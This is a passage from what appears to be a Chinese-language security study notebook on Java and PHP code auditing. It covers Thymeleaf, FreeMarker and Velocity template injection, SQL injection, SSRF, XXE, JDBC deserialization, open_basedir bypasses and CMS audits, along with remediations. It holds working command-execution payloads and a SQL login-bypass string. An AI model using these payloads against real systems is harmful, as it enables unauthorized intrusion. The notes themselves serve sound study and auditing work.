} @GetMapping(\"/doc/{document}\") public void getDocument(@PathVariable String document) { log.info(\"Retrieving \" + document); //returns void, so view name is taken from URI } } 相关解释 @Controller 一般应用在有返回界面的应用场景下.例如，管理后台使用了 thymeleaf 作为模板开发，需要从后台直接返回 Model 对象到前台，那么这时候就需要使用 @Controller 来注解。 控制层处理完请求，返回视图名称，从而对应模板来渲染结果，比如 return \"welcome\"→resources/templates/welcome.html return \"/user/en/welcome\"→resources/templates/user.en/welcome.html 模板放在resources/templates中 Spring Boot Web Thymeleaf Example meleaf Thymeleaf模版注入复现 Spring ThymeleafView会使用表达式解析模版名称，若是将用户输入的参数拼接到模版路径中，可以造成表达式注入。 Demo代码veracode-research/spring-view-manipulation: When MVC magic turns black (github.com) @GetMapping(\"/path\") public String path(@RequestParam String lang) { return \"user/\" + lang + \"/welcome\"; //template path is tainted } payload /path?lang=__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(\"whoami\").getInputStream()).next()}__::.x 其中new了一个java.util.Scanner对象，用于读取字符。传入Scanner中的参数为T(java.lang.Runtime).getRuntime().exec(\"id\").getInputStream() T( )用于访问类作用域的方法和常量，这块是关于spel表达式的 java.util.Scanner是可以省略的，它在此仅用于回显，无需回显时直接T(java.lang.Runtime).getRuntime().exec(\"id\")执行命令即可。 ::在此为必须，不然不会进入表达式解析过程，并且一定得在表达式后面。 .x在此处可忽略（return \"user/\" + lang + \"/welcome\";） 解析路径的代码在ThymeleafView:277，其中viewTemplateName中一定要包含::，不然不会进入表达式解析过程。 if (!viewTemplateName.contains(\"::\")) { // No fragment specified at the template name templateName = viewTemplateName; markupSelectors = null; } else { // Template name contains a fragment name, so we should parse it as such final IStandardExpressionParser parser = StandardExpressions.getExpressionParser(configuration); final FragmentExpression fragmentExpression; try { // By parsing it as a standard expression, we might profit from the expression cache fragmentExpression = (FragmentExpression) parser.parseExpression(context, \"~{\" + viewTemplateName + \"}\"); } catch (final TemplateProcessingException e) { throw new IllegalArgumentException(\"Invalid template name specification: '\" + viewTemplateName + \"'\"); } 跟进parser.parseExpression方法，在StandardExpressionParser中对~{viewTemplateName}~进行处理 final String preprocessedInput = (preprocess? StandardExpressionPreprocessor.preprocess(context, input) : input); 继续跟进StandardExpressionPreprocessor.preprocess，在StandardExpressionPreprocessor中，使用正则表达式将路径中的表达式提取出来。其中正则规则：\\_\\_(.*?)\\_\\_（表示非贪婪匹配两个__之间的内容），匹配得到${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(\"id\").getInputStream()).next()} 提取表达式之后就是根据框架进行对应的表达式解析，这里是Spring所以用的就是SpringEL表达式解析。 @GetMapping(\"/doc/{document}\") public void getDocument(@PathVariable String document) { log.info(\"Retrieving \" + document); //returns void, so view name is taken from URI } @PathVariable 处理请求 url 路径中的参数 /user/{id} payload /doc/__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22whoami%22).getInputStream()).next()%7d__::.x.x 这里要注意如果要有回显的话，需要在末尾再加上一个.x，原因是Spring分配URI时会自动抹去后缀名，导致缺少了.x，无法正常回显。再加一个.x就能正常回显。 漏洞修复 配置ResponseBody或RestController注解 @ResponseBody注解告诉spring不再返回视图名称，而是直接返回值 @GetMapping(\"/safe/fragment\") @ResponseBody public String safeFragment(@RequestParam String section) { return \"welcome :: \" + section; //FP, as @ResponseBody annotation tells Spring to process the return values as body, instead of view name } 通过redirect: 根据springboot定义，如果名称以redirect:开头，则不再调用ThymeleafView解析，调用RedirectView去解析controller的返回值 @GetMapping(\"/safe/redirect\") public String redirect(@RequestParam String url) { return \"redirect:\" + url; //FP as redirects are not resolved as expressions } 方法参数中设置HttpServletResponse 参数 由于controller的参数被设置为HttpServletResponse，Spring认为它已经处理了HTTP Response，因此不会发生视图名称解析。 这里的前提条件是returnValue为空，所以这种修复方法只有在返回值为空的情况下才有效。 @GetMapping(\"/safe/doc/{document}\") public void getDocument(@PathVariable String document, HttpServletResponse response) { log.info(\"Retrieving \" + document); //FP } 总结 这个漏洞原理很简单，就是Thymeleaf的视图参数可进行表达式解析，若用户输入可控制视图参数，就会导致SpEL注入漏洞产生。 漏洞细节点是payload的构造，需要添加__和::引导表达式解析。 Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2023-10-29 16:54:07 "},"03.代码审计/JAVA/JavaAttack.html":{"url":"03.代码审计/JAVA/JavaAttack.html","title":"Java Attack","keywords":"","body":"代码执行 模板注入SSTI FreeMarker FreeMarker拥有自己的模板编写规则并使用FTL表示，即FreeMarker模板语言，比如:myweb.html.ftl就是一个FreeMarker模板文件 Freemarker可利用的点在于模版语法本身，直接渲染用户输入payload会被转码而失效，所以一般的利用场景为上传或者修改模版文件 poc 命令执行： ${ex(\"open -a Calculator.app\"\")} ${value(\"java.lang.ProcessBuilder\",\"whoami\").start()} import os;os.system(\"calc.exe\") ${ ex(\"open -a Calculator.app\") } 文件读取： FILE:[ ${byte}, ] FILE:[ ${byte}, ] FILE:[ ${byte}, ] 这里利用载荷是要把上面的Object替换替换成可编辑模板中可用的真实的Object后利用才行 velocity poc // 命令执行1 #set($e=\"e\") $e.getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\",null).invoke(null,null).exec(\"open -a Calculator\") // 命令执行2 #set($x='')## #set($rt = $x.class.forName('java.lang.Runtime'))## #set($chr = $x.class.forName('java.lang.Character'))## #set($str = $x.class.forName('java.lang.String'))## #set($ex=$rt.getRuntime().exec('id'))## $ex.waitFor() #set($out=$ex.getInputStream())## #foreach( $i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end // 命令执行3 #set ($e=\"exp\") #set ($a=$e.getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\",null).invoke(null,null).exec($cmd)) #set ($input=$e.getClass().forName(\"java.lang.Process\").getMethod(\"getInputStream\").invoke($a)) #set($sc = $e.getClass().forName(\"java.util.Scanner\")) #set($constructor = $sc.getDeclaredConstructor($e.getClass().forName(\"java.io.InputStream\"))) #set($scan=$constructor.newInstance($input).useDelimiter(\"\\A\")) #if($scan.hasNext()) $scan.next() #end Thymeleaf poc实质上是spel表达式注入 命令执行 // 参数传参 __${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(\"whoami\").getInputStream()).next()}__::.x // 路径传参 __$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22whoami%22).getInputStream()).next()%7d__::.x.x Dubbo--20880端口 dubbo是一个基于Spring的RPC（远程过程调用）框架，能够实现服务的远程调用、服务的治理 Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2024-12-24 21:19:31 "},"03.代码审计/JAVA/Java代审--常见漏洞函数.html":{"url":"03.代码审计/JAVA/Java代审--常见漏洞函数.html","title":"Java代码审计--常见漏洞函数","keywords":"","body":"Sql注入 Java中的数据库操作 JDBC 数据库连接 原始 String CLASS_NAME = \"com.mysql.cj.jdbc.Driver\"; //正确设置时区，否则会报错 String URL = \"jdbc:mysql://localhost:3306/mybatis?characterEncoding=UTF-8&serverTimezone=UTC\"; String USERNAME = \"root\"; String PASSWORD = \"123\"; Class.forName(CLASS_NAME);// 注册JDBC驱动类 Connection con = DriverManager.getConnection(URL, USERNAME, PASSWORD); Datasource 使用Java程序访问数据库时，Java 代码并不是直接通过 TCP 连接去访问数据库，而是通过 JDBC 接口来访问，而 JDBC 接口则通过 JDBC 驱动来实现真正对数据库的访问。 连接池类似于线程池，在一些情况下我们会频繁地操作数据库，此时Java在连接数据库时会频繁地创建或销毁句柄，增大资源的消耗。为了避免这样一种情况，我们可以提前创建好一些连接句柄，需要使用时直接使用句柄，不需要时可将其放回连接池中，准备下一次的使用。类似这样一种能够复用句柄的技术就是池技术。 spring.datasource.url=jdbc:mysql://localhost:3306/mybatis?serverTimezone=UTC&useUnicode=true&characterEncoding=utf-8&useSSL=true spring.datasource.username=root spring.datasource.password=123 spring.datasource.type=com.alibaba.druid.pool.DruidDataSource spring.datasource.driver-class-name=com.mysql.jdbc.Driver 查询函数 statement.executeQuery() String sql = \"select * from user where name = '\" + username + \"'\"; ResultSet rs = statement.executeQuery(sql); PreparedStatement PrepareStatement会对SQL语句进行预编译 传参'admin' 预编译会对传入的参数自动加上一对单引号，并对参数值进行转义操作 预编译使用 单个参数 String sql=\"select * from user where name=?\"; PreparedStatement statement = con.prepareStatement(sql); statement.setString(1,username); ResultSet rs = statement.executeQuery(); in语句 在in当中使用拼接而不使用占位符做预编译的原因是因为很多时候无法确定范围里含有多少个对象 public int gradeDelete(Connection con, String delIds) throws Exception{ String num = \"\"; //将对象分割开来,根据实际传参情况进行分割 String[] spl = delIds.split(\".\"); //根据对象的个数添加同量的占位符?,用来预编译 for(int i = 0; i like语句 正确的写法 String sql = \"select * from users like ?\"; PreparedStatement statement = con.prepareStatement(sql); statement.setString(\"txf\",\"%\"+username+\"%\"); ResultSet rs = statement.executeQuery(); 或者 String sql = \"select * from users like concat('%',?,'%')\"; PreparedStatement statement = con.prepareStatement(sql); statement.setString(\"txf\",username); ResultSet rs = statement.executeQuery(); 错误的写法 String sql = \"select * from users like %?%\"; PreparedStatement statement = con.prepareStatement(sql); statement.setString(1,username); ResultSet rs = statement.executeQuery(); 当然对于order by这种使用了预编译会导致Sql语句失效的地方，还是需要手动写黑白名单的过滤才可以。 Hibernate框架 Hibernate是一个开放源代码的对象关系映射框架，它对JDBC进行了非常轻量级的对象封装，使得Java程序员可以随心所欲的使用对象编程思维来操纵数据库。 Hibernate可以使用hql来执行SQL语句，也可以直接执行SQL语句，无论是哪种方式都有可能导致SQL注入 Sql查询 HQL语句 String hql = \"from People where username = '\" + username + \"' and password = '\" + password + \"'\"; Query query = session.createQuery(hql); List list = query.list(); System.out.println(list); Sql语句 Query query = session.createNativeQuery(\"select * from user where username = '\" + username + \"' and password = '\" + password + \"'\"); 预编译使用 命名参数（named parameter) Query query = session.createQuery(\"from users name = :name\", User.class); query.setParameter(\"name\", parameter); 位置参数（Positional parameter） Query query = session.createQuery(\"from users name = ?\", User.class); query.setParameter(0, parameter); 命名参数列表（named parameter list） List names = Arrays.asList(\"111\", \"222\"); Query query = session.createQuery(\"from users where name in (:names)\", User.class); query.setParameter(\"names\", names); 类实例（JavaBean） user1.setName(\"khaz\"); Query query = session.createQuery(\"from users where name =:name\", User.class); query.setProperties(user1); Mybatis框架 MyBatis 是一款优秀的持久层框架，它支持自定义 SQL、存储过程以及高级映射。MyBatis 免除了几乎所有的 JDBC 代码以及设置参数和获取结果集的工作。MyBatis 可以通过简单的 XML 或注解来配置和映射原始类型、接口和 Java POJO（Plain Old Java Objects，普通老式 Java 对象）为数据库中的记录。 使用 基于注解 dao @Mapper public interface UserMapper { @Select(\"select * from user\") public List findAll(); } 要么在每一个dao上加上@Mapper，或者不加然后在启动类加上@MapperScan(\"dao所在的包\") entity public class User { private int id; private String name; private String pwd; } Controller @RestController @RequestMapping(value = \"/mybatis\") public class SqlDemo { @Autowired private UserMapper userMapper; @RequestMapping(value = \"/sql\") public List mybatisVuln01(@RequestParam(\"username\") String username) { return userMapper.queryByName(username); } } 基于XML 主要区别在于sql语句一个是写在Mapper注解，一个是写在XML中 mapper select * from user dao @Mapper @Repository public interface UserXmlMapper { public List findAll(); } 映射关系 mybatis: mapper-locations: classpath:mapper/*Mapper.xml # mapper映射文件路径 type-aliases-package: com.itheima.springbootmybatis.domain entity public class User { private int id; private String name; private String pwd; } Controller @RestController @RequestMapping(value = \"/mybatis\") public class SqlDemo { @Autowired private UserMapper userMapper; @RequestMapping(value = \"/sql\") public List mybatisVuln01(@RequestParam(\"username\") String username) { return userMapper.queryByName(username); } } 传参方式 Mybatis下有两种传参方式，分别是${}以及#{} ${}传参 使用${}的方式传参，mybatis是将传入的参数直接拼接到SQL语句上 Mapper @Select(\"select * from user where name = '${username}'\") public List queryByName(String username); Controller @RequestMapping(value = \"/sql\") public List mybatisVuln01(@RequestParam(\"username\") String username) { return userMapper.queryByName(username); } #{}传参 使用#{}传参则相当于使用了预编译，相当于?占位符 Mapper @Select(\"select * from user where name = #{username}\") public List queryByName(String username); 总结 可能存在的sql注入点 DAO: 存在拼接的SQL语句 String sql=\"select * from user where id=\"+id Hibernate框架 session.createQuery(\"from Book where title like '%\" + userInput + \"%' and published = true\") Mybatis框架 Select * from news where title like concat(\"%\"+\"${title}\"+\"%\") Select * from news where id in (${id})， Select * from news where title ='java' order by ${time} asc ⚠️ 注意并不是全部的参数拼接都会产生漏洞的，有以下几种情况是不存在SQL注入的： param不可控 param不是字符类型，比如说parameter为int类型，只能传入数字，就没法产生SQL注入 param在传递过程中被转义或过滤，比如filter过滤器 修复 正确使用预编译,如占位符问题，Mybatis框架使用#{} 不能预编译的地方如Order By，可以加filter来进行黑名单过滤 Spring Boot项目挖掘 观察项目使用了哪一种方法来操作数据库 从POM.XML中可以看到使用了Mybatis框架 搜索相关关键词，找到可能存在的点 如Mybatis框架就搜索${，可以看到这里因为是like模糊查询所以使用了${}来进行拼接 逆向追踪拼接的参数传入过程，逆向追踪参数的路径大致为Mapper -> Dao -> ServiceImpl -> Controller 搜索得到有两处查询使用了${}来进行拼接 通过namespace可以找到对应的Dao 在Dao中找到对应方法， find usages跳转到对应实现 再次追踪该方法调用，来到Crontroller层 所属类 所以有如下请求 /admin/goods/list?page=xx&limit=xx&goodsName= 使用sqlmap验证 另一处也是如此分析 总结 本次较为简单，因为没有过滤的存在，主要是学习如何寻找以及数据的流向。 那么对于SQL注入的审计，如Mybatis框架先在Mapper中搜寻是否存在${}拼接的情况，尤其注意order by、group by、like、in。找到拼接后再逆向追踪参数，判断参数是否可控，是否是字符类型，检查是否存在过滤器过滤SQL字符。 SSRF 相关函数 带HTTP开头，只支持HTTP、HTTPS协议的 String url = request.getParameter(\"url\"); URL u = new URL(url); // HttpURLConnection HttpURLConnection httpURLConnection = (HttpURLConnection)urlConnection; // OkHttpClient OkHttpClient client = new OkHttpClient(); com.squareup.okhttp.Request ok_http = new com.squareup.okhttp.Request.Builder().url(u).build(); client.newCall(ok_http).execute(); // HttpClients CloseableHttpClient client = HttpClients.createDefault(); HttpGet httpGet = new HttpGet(u); HttpResponse httpResponse = client.execute(httpGet); 支持sun.net.www.protocol所有协议的 //openStream InputStream inputStream = u.openStream(); //URLConnection URLConnection urlConnection = u.openConnection(); 其他 // ImageIO，如果获取到的不是图片，会返回null BufferedImage img = ImageIO.read(u); java自身对ssrf的限制 支持的协议 JDK1.8如下图 低版本的JDK1.7是支持gopher协议的 DNS Rebinding限制 Java应用的默认TTL为10s，这个默认配置会导致DNS Rebinding绕过失败。也就是说，默认情况下，Java应用不受DNS Rebinding影响。 302跳转限制 java默认会URL重定向。 访问payload http://localhost:8080/download?url=http://joychou.me/302.php 收到异常： java.net.MalformedURLException: unknown protocol: gopher 跟踪报错代码： private boolean followRedirect() throws IOException { if(!this.getInstanceFollowRedirects()) { return false; } else { final int var1 = this.getResponseCode(); if(var1 >= 300 && var1 从上面的followRedirect方法可以看到： 实际跳转的url也在限制的协议内 传入的url协议必须和重定向的url协议一致 Java中的file协议Trick Java的file协议有一个trick，如果file协议的路径是目录就会列出该目录下的所有文件 file:///跟file:/是一样的 修复方案 解析目标URL 获取scheme、host（推荐使用系统内置函数完成,避免自己使用正则提取） 校验scheme 检查 scheme 是否为合法 (如非特殊需求请只允许 http 和 https) 获取解析IP 解析 host 获取 dns 解析后的 IP 地址 检测IP是否合法 检查解析后的IP地址是否为外网地址或者合法IP（转换为统一格式的IP来判断） 请求URL 先检验URL对应的IP是否合法，再发包 如果有重定向，回到步骤1，并且设置最大重定向次数 关于DNS Rebinding的修复 如果请求的域名是在一定范围内的，比如说存储桶静态文件，可以设定域名白名单 请求url时，不使用域名访问，而是先获得对应的IP，对IP进行判断后，再请求该IP XXE 相关函数 xmlReader 漏洞代码 XMLReader xmlReader = XMLReaderFactory.createXMLReader(); xmlReader.parse(new InputSource(new StringReader(body))); // parse xml 修复 XMLReader xmlReader = XMLReaderFactory.createXMLReader(); // fix code start xmlReader.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true); xmlReader.setFeature(\"http://xml.org/sax/features/external-general-entities\", false); xmlReader.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", false); //fix code end xmlReader.parse(new InputSource(new StringReader(body))); // parse xml SAXBuilder 漏洞代码 SAXBuilder builder = new SAXBuilder(); // org.jdom2.Document document builder.build(new InputSource(new StringReader(body))); // cause xxe 修复 SAXBuilder builder = new SAXBuilder(); builder.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true); builder.setFeature(\"http://xml.org/sax/features/external-general-entities\", false); builder.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", false); // org.jdom2.Document document builder.build(new InputSource(new StringReader(body))); SAXReader 漏洞代码 SAXReader reader = new SAXReader(); // org.dom4j.Document document reader.read(new InputSource(new StringReader(body))); // cause xxe 修复 SAXReader reader = new SAXReader(); reader.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true); reader.setFeature(\"http://xml.org/sax/features/external-general-entities\", false); reader.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", false); // org.dom4j.Document document reader.read(new InputSource(new StringReader(body))); SAXParser 漏洞代码 SAXParserFactory spf = SAXParserFactory.newInstance(); SAXParser parser = spf.newSAXParser(); parser.parse(new InputSource(new StringReader(body)), new DefaultHandler()); // parse xml 修复 SAXParserFactory spf = SAXParserFactory.newInstance(); spf.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true); spf.setFeature(\"http://xml.org/sax/features/external-general-entities\", false); spf.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", false); SAXParser parser = spf.newSAXParser(); parser.parse(new InputSource(new StringReader(body)), new DefaultHandler()); // parse xml Digester 漏洞代码 Digester digester = new Digester(); digester.parse(new StringReader(body)); // parse xml 修复 Digester digester = new Digester(); digester.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true); digester.setFeature(\"http://xml.org/sax/features/external-general-entities\", false); digester.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", false); digester.parse(new StringReader(body)); // parse xml DocumentBuilder--普通 漏洞代码 DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance(); DocumentBuilder db = dbf.newDocumentBuilder(); InputSource is = new InputSource(request.getInputStream()); Document document = db.parse(is); // parse xml 修复 DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance(); dbf.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true); dbf.setFeature(\"http://xml.org/sax/features/external-general-entities\", false); dbf.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", false); DocumentBuilder db = dbf.newDocumentBuilder(); StringReader sr = new StringReader(body); InputSource is = new InputSource(sr); db.parse(is); // parse xml DocumentBuilder--Xinclude 漏洞代码 DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance(); dbf.setXIncludeAware(true); // 支持XInclude dbf.setNamespaceAware(true); // 支持XInclude DocumentBuilder db = dbf.newDocumentBuilder(); StringReader sr = new StringReader(body); InputSource is = new InputSource(sr); Document document = db.parse(is); // parse xml 修复 DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance(); dbf.setXIncludeAware(true); // 支持XInclude dbf.setNamespaceAware(true); // 支持XInclude dbf.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true); dbf.setFeature(\"http://xml.org/sax/features/external-general-entities\", false); dbf.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", false); DocumentBuilder db = dbf.newDocumentBuilder(); StringReader sr = new StringReader(body); InputSource is = new InputSource(sr); Document document = db.parse(is); // parse xml XMLReader 漏洞代码 SAXParserFactory spf = SAXParserFactory.newInstance(); SAXParser saxParser = spf.newSAXParser(); XMLReader xmlReader = saxParser.getXMLReader(); xmlReader.parse(new InputSource(new StringReader(body))); 修复 SAXParserFactory spf = SAXParserFactory.newInstance(); SAXParser saxParser = spf.newSAXParser(); XMLReader xmlReader = saxParser.getXMLReader(); xmlReader.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true); xmlReader.setFeature(\"http://xml.org/sax/features/external-general-entities\", false); xmlReader.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", false); xmlReader.parse(new InputSource(new StringReader(body))); DocumentHelper 漏洞代码 DocumentHelper.parseText(body); 修复 升级dom4j到2.1.1及以上，该版本及以上禁用了ENTITY XMLBeam Spring Data Commons 1.13至1.13.11以及2.0至2.0.6的版本在与XMLBeam1.4.14或更早的版本进行结合使用时，XMLBeam不会限制XML外部实体应用 CVE-2018-1259复现 漏洞代码 @ProjectedPayload public interface UserPayload { @XBRead(\"//userName\") String getUserName(); } return ResponseEntity.ok(String.format(\"hello, %s!\", user.getUserName())) 修复 升级版本 相关协议 file://和netdoc:// 读取文件 file:// netdoc:// 列目录 file:// netdoc:// ftp://--数据外带 工具： TheTwitchy/xxer: A blind XXE injection callback handler. Uses HTTP and FTP to extract information. Originally written in Ruby by ONsec-Lab. (github.com) python2 .\\xxer.py -p 1234 -H 192.168.23.108 -p是指定http_server的端口，ftp_server默认端口为2121 启动后生成的恶意DTD为 \"> 发送payload 查看ftp日志，得到外带数据 注意点： jdk版本 小于 7u141 和 小于 8u162 才可以读取整个文件 有特定字符时无法读取 我这里是JDK8u371，文件中含有' & % / #时无法读取 别人的测试结果 jar:// 一篇文章带你理解漏洞之 XXE 漏洞 | K0rz3n's Blog 反序列化 jdbc反序列化 JDBC(Java Database Connectivity)是Java提供对数据库进行连接、操作的标准API。Java自身并不会去实现对数据库的连接、查询、更新等操作而是通过抽象出数据库操作的API接口(JDBC)，不同的数据库提供商必须实现JDBC定义的接口从而也就实现了对数据库的一系列操作。 jdbc反序列化指在通过JDBC连接MySQL服务端时，会有几句内置的查询语句需执行，其中两个查询的结果集在MySQL客户端进行处理时会被ObjectInputStream.readObject()进行反序列化处理。如果攻击者可以控制JDBC连接设置项，那么可以通过设置其配置指向恶意MySQL服务触发MySQL JDBC客户端的反序列化漏洞 jdbc:mysql://xxx.xxx.xxx.xxx:3306/test?\"+\"autoDeserialize=true\"+\"&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor 将 JDBC 连接地址指向攻击者事先准备好的恶意服务器，这个服务器可以返回恶意的序列化数据。 指定 autoDeserialize 参数为 true，mysql 客户端就可以自动反序列化恶意 payload。 使用 ServerStatusDiffInterceptor 触发客户端和服务端的交互和反序列化。 Shiro Weblogic Log4j fastjson rmi jndi jdbc Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2024-12-26 15:39:19 "},"03.代码审计/PHP/phpinfo.html":{"url":"03.代码审计/PHP/phpinfo.html","title":"phpinfo中的信息","keywords":"","body":"配置文件 PHP: php.ini 核心指令说明 - Manual ini_set() https://www.php.net/manual/zh/ini.list.php phpinfo 总结 phpinfo中的重要信息 变量 作用 open_basedir 限制目录访问（可以绕过） disable_function 禁用函数（可以绕过） session.save_path 配合文件包含 _SERVER 各种主机信息 pecl confing.php写🐎 open_basedir绕过 在index.php下 ini_set('open_basedir', '/var/www/html/'); 所以如果用户通过index.php来访问服务器时，只能访问/var/www/html/ open_basedir绕过 function bypass_open_basedir(){ if(!file_exists('bypass_open_basedir')){ mkdir('bypass_open_basedir'); } chdir('bypass_open_basedir'); @ini_set('open_basedir','..'); @$_Ei34Ww_sQDfq_FILENAME = dirname($_SERVER['SCRIPT_FILENAME']); @$_Ei34Ww_sQDfq_path = str_replace(\"\\\\\",'/',$_Ei34Ww_sQDfq_FILENAME); @$_Ei34Ww_sQDfq_num = substr_count($_Ei34Ww_sQDfq_path,'/') + 1; $_Ei34Ww_sQDfq_i = 0; while($_Ei34Ww_sQDfq_i disable_function绕过 如何设置disable_function 在php配置文件php.ini中设置 绕过：https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions ​ https://www.freebuf.com/articles/network/263540.html 常见的webshell管理工具都自带相关绕过的模块。 配合文件包含Getshell Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2023-10-27 17:12:44 "},"03.代码审计/PHP/PHP代码审计.html":{"url":"03.代码审计/PHP/PHP代码审计.html","title":"PHP代码审计","keywords":"","body":" [x] BlueCMS [x] SeaCMS [x] DedeCMS [x] ThinkPHP 调试 https://blog.csdn.net/Xxy605/article/details/120973447 思路 From https://www.anquanke.com/post/id/265092#h3-5 函数集文件，通常命名包含function或者common等关键字，这些文件里面是一些公共的函数，提供其他文件统一调用，所以大多数文件都会在文件头部包含到其他文件。寻找这些文件一个非常好用的技巧就是去打开index.php或者一些功能性文件，在头部一般都能找到。 配置文件，通常命名中包括config关键字，配置文件包括web程序运行必须的功能性配置选项以及数据库等配置信息。从这个文件中可以了解程序的小部分功能，另外看这个文件的时候注意观察配置文件中参数值是单引号还是用双引号括起来，如果是双引号可能就存在代码执行的问题了。 安全过滤文件，安全过滤文件对代码审计至关重要，这关系到我们挖掘到的可以点能否直接利用，通常命名中带有filter、safe、check等关键字，这类文件主要是对参数进行过滤，大多数的应用其实会在参数的输入做一下addslashes()函数的过滤。 index文件，index是一个程序的入口，所以通常我们只要读一读index文件就可以大致了解整个程序的架构、运行的流程、包含到的文件，其中核心的文件有哪些。而不同目录的index文件也有不同的实现方式，建议最好将几个核心目录的index文件都通读一遍。 总结大致流程 1、先全局总览：入口文件、路由、全局处理方式等 2、定向功能审计：黑盒(找到敏感功能)+白盒（定位到代码进行审计） 3、敏感函数回溯 先黑盒+白盒看敏感功能，再用自动化审计工具跑一遍并验证，最后再根据漏洞危险函数去回溯 自动化审计工具 RIPShttps://github.com/J0o1ey/rips-Chinese seay Fortify bluecms 黑盒测试 用户注册 在注册时，邮箱插入xss代码 用户头像 上传文件，只允许上传图片后缀的文件，上传后有给出图片路径，那么不能配合.htaccess，需要找到一个文件包含的点来包含文件。 修改密码 是否存在越权,测试了没有 发布新闻 这里分类选择不了，应该是要管理员发布。 目录扫描 管理员 其他 后台登录 这里没有验证码验证，那么可以很轻松地进行爆破，得到usernmae=admin，passwd=admin 进去之后，可以看到一个建议，install文件夹，上面通过dirsearch也扫描出了这个文件，如果我们可以使用这个文件夹来重新安装网站，那么我们就可以直接重置管理员了，可惜是不可以的。 常用操作 发布本地新闻这里存在一个文件上传操作，但是也只能上传图片 会员管理 可以发现触发了之前的xss，那么如果我们没有登陆上后台，也可以通过这个xss来🎣获取管理员的cookie。 也可以修改管理员密码，而且没有任何验证，可以直接修改。。 白盒审计 先看一下目录 前台 先看一下前台的index.php，内容差不多就是渲染页面，没有用户可控的参数，所以关注其包含的其他文件。 跟进common.inc.php看一下 关键部分，用来验证用户身份，其中cookie中的参数是可控的。 先判断cookie中是否有user_id，有的话再继续判断user_name和user_pwd是否存在，如果存在就check_cookie，如果只有user_name存在就查询名字是否只有一个，其他情况set_cookie。 sql注入 跟进check_cookie 查username对应的密码，经过散列处理判断密码是否正确。 跟进getone--在include/mysql.class.php中 可以看到没有对sql语句做任何处理，直接用mysql_query进行查询，sql语句错误时，返回错误消息Query error，然后是前面加了一个@，所以不能用报错注入。 再观察include/mysql.class.php可以发现 发现存在宽字节注入，那么这个CMS就可以随便注入了。。。（因为所有的sql操作都是用这个mysql类） 以ad_js.php为例 文件包含+文件上传 虽然有白名单限制，只能上传图片，但是没有对文件内容进行过滤 并且在user.php中，没有对$_POST['pay']进行过滤，存在目录穿越，就可以包含上传的用户头像。 任意文件删除 publish.php user.php ​ 需要先插入一条新闻，新闻名为要删除的文件的路径。 后台--/admin 还是先看一下index.php，也是只是输出了CMS和系统的一些信息，所以关注其包含的文件 关键内容 对输入的参数都使用addslashes()进行转义,不过还有$SERVER没有进行处理。 ​ 使用session来验证admin身份。还是一样的使用check_cookie来判断， ​ ​ 需要得到admin的pwd和cookie_hash，这两个都在数据库中，可以利用前台的sql注入获得，所以可以通过这个来登录admin用户。 任意文件读取 任意文件上传 文件路径只作了去除头尾空格的处理，存在目录穿越；文件内容实际上是调用了stripslashes，并没有过滤。 测试 SeaCMS 网站架构，无框架，目录结构如下 ├─admin # 后台 ├─css # 存放css文件 ├─files # 存放页面 ├─images # 存放图片 ├─inc # 存放网站配置，校验，过滤文件 ├─install # 网站安装 ├─seacmseditor # 网站编辑器 ├─template # 网站模板 └─upload # 存放上传文件 查看入口文件 所有的入口都是通过传递r参数来分发路由，对应files目录中的文件 这里只用addslashes进行了转义，明显路径穿越+文件包含 其他思路 如果是linux系统，也可以通过pearcmd.php来getshell 在7.3及以前，pecl/pear是默认安装的；在7.4及以后，需要我们在编译PHP的时候指定--with-pear才会安装 尝试%00截断路径，造成任意文件读取，不知道为啥失败了，环境：php5.3.29，magic_quotes_gpc=OFF 如果php版本小于5.2.8，linux 需要文件名长于 4096，windows 需要长于 256，超过部分会被丢弃从而实现文件包含绕过后缀.php限制 查看配置文件 通过install目录下的InstallLock.txt是否存在来判断是否安装，如果可以删除该文件，就可以配合入口文件的文件包含漏洞来重新安装网站。 数据库编码为utf-8，不存在宽字节注入 查看身份校验文件 垂直越权，只要在cookie中加入user值 前台 about.php 使用addslashes来过滤，逃逸不了引号，所以不存在sql注入 concat.php sql都用了addslashes来过滤 但是存在xss cookie:name=\">alert(/xss/) content.php 存在数字型终于可以注入了，配合mysql_error进行报错注入 submit.php 因为验证码正确后也不刷新，所以可以使用同一个验证码进行注入 存储xss 过滤 但是还是可以在name处保存 输出点 后台 后台登录 没有过滤，可以使用联合查询构造临时用户数据登录,或者报错注入拿到密码后解密登录 判断字段数 确定用户名，密码字段位置 联合查询登陆 user=-1'+union+select+1,2,'admin','c4ca4238a0b923820dcc509a6f75849b',5,6,7,8#&password=1&login=yes 文件上传处 up.class.php 白名单，文件大小检测，文件时间戳重命名,图片裁剪生成缩略图 